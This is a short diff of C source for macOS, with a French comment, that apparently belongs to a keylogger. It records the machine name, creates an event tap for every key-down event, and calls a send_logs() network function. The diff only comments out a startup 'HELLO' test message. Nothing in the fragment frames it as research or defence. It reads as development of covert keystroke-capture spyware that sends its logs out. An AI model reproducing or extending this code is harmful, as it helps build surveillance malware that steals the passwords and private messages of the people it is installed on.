@@ -174,7 +174,7 @@ int main(int argc, char *argv[]) {
     g_machine = get_machine_name();
 
     // Petit test réseau au démarrage
-    send_logs("HELLO");
+//    send_logs("HELLO");
 
     CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
     CFMachPortRef eventTap = CGEventTapCreate(kCGHIDEventTap,
